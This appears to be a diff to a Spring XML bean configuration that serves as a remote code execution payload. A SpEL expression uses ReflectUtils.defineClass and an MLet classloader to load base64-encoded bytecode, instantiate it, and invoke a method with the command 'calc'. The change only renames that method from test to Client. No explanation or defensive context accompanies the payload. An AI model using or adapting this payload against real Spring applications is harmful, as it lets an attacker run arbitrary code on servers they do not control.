@@ -14,6 +14,6 @@
     <bean id="cmd" class="java.lang.String">
         <constructor-arg value="calc"></constructor-arg>
     </bean>
-    <bean  class="#{T(org.springframework.cglib.core.ReflectUtils).defineClass('CMDResponse',T(org.springframework.util.Base64Utils).decodeFromString(base64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().test(cmd.toString())}">
+    <bean  class="#{T(org.springframework.cglib.core.ReflectUtils).defineClass('CMDResponse',T(org.springframework.util.Base64Utils).decodeFromString(base64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().Client(cmd.toString())}">
     </bean>
 </beans>
